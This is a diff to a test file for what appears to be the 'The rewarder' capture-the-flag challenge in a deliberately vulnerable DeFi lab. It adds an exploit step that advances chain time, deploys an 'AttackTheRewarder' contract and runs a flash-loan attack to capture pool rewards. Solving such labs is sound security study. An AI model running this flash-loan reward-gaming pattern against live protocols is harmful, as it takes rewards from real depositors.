@@ -66,6 +66,13 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let amountFlashLoan = ethers.utils.parseEther('100000');
+        await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]);
+
+        const attackContract = await (await ethers.getContractFactory('AttackTheRewarder', attacker)).deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, attacker.address);
+
+        // await this.liquidityToken.connect(attacker).approve(this.rewarderPool.address, amountFlashLoan);
+        await attackContract.attack(TOKENS_IN_LENDER_POOL);
     });
 
     after(async function () {
@@ -89,7 +96,6 @@ describe('[Challenge] The rewarder', function () {
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
         let rewards = await this.rewardToken.balanceOf(attacker.address);
-
         // The amount of rewards earned should be really close to 100 tokens
         let delta = ethers.utils.parseEther('100').sub(rewards);
         expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));
